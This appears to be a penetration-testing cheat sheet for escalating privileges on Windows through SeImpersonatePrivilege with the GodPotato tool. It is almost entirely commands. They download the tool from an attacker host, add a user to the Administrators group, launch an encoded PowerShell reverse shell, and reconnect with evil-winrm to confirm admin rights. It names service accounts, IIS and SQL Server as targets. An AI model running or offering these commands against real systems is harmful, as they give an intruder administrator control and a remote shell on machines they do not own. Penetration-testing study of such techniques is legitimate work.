## SeImpersonatePrivilege Exploitation

### Check for Privilege
```powershell
whoami /priv
# Look for: SeImpersonatePrivilege   Enabled
```

### GodPotato Exploitation
```powershell
# Download GodPotato
iwr -uri http://ATTACKER_IP/GodPotato.exe -o GodPotato.exe

# Add user to Administrators
.\GodPotato.exe -cmd "cmd /c net localgroup Administrators username /add"

# Direct reverse shell
.\GodPotato.exe -cmd "cmd /c powershell -e <base64_payload>"
```

### After Exploitation
```powershell
# Reconnect with elevated privileges
evil-winrm -u "username" -p "password" -i $IP

# Verify admin access
whoami /groups | findstr Admin
```

**Works with:** Service accounts, IIS worker processes, SQL Server
